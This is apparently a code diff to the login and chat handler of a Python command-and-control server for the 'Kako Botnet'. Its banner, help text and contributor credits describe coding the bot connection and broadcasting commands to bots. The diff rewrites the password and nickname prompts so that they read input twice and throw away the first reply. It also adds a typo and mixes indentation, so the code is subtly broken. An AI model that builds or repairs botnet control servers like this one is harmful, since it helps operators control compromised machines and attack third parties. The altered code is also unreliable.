@@ -53,16 +53,22 @@ def clientThread(conn):
 				pass
 
 		def rank(conn, prefix="Rank: "):
-			conn.send(prefix)
-			return conn.recv(512)
+		    conn.send(prefix)
+		    return conn.recv(512)
 
-		def password(conn, prefix="Rank Password: "):
-			conn.send(prefix)
-			return conn.recv(512)
+
+		def password(conn, prefix="Password: "):
+		    conn.send(prefix)
+		    data = conn.recv(512)
+		    if data:
+		        return conn.recv(512)
+
 
 		def nickname(conn, prefix="Nickname: "):
-			conn.send(prefix)
-			return conn.recv(512)
+		    conn.send(prefix)
+		    data = conn.recv(512)
+		    if data:
+		        return conn.recv(512)
 
 		rank = rank(conn)
 		password = password(conn)
@@ -70,7 +76,7 @@ def clientThread(conn):
 		if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
 			conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 			conn.sendall("[?] Please use the custom client.py made by Law\r\n")
-			conn.sendall("[?] Or else it may not work as its been untested with other clients\r\n")
+			conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
 			conn.sendall("[?] Type >help for a list of commands\r\n")
 			conn.sendall("[?] Your nickname is: %s" % nickname)
 			while True:
@@ -83,7 +89,7 @@ def clientThread(conn):
 						remove(conn)
 
 					logs = file("logs.txt", "a")
-					logs.write("%s:%s:%s - %s\r\n" % (rank, password, nickname, message))
+					logs.write("%s:%s:%s - %s" % (rank, password, nickname, message))
 
 					if message.lower().startswith(">help"):
 						conn.sendall("[>] Helpful Info [<]\r\n")
@@ -119,6 +125,7 @@ def clientThread(conn):
 						conn.sendall("[?] Also coded the client.py file from scratch\r\n")
 						conn.sendall("[?] Picses - Coded the bot connection\r\n")
 						conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
+						conn.sendall("[?] x7041 - Fixed the login over lap\r\n")
 
 					if message.lower().startswith(">password"):
 						if rank.startswith(rankAdmin):
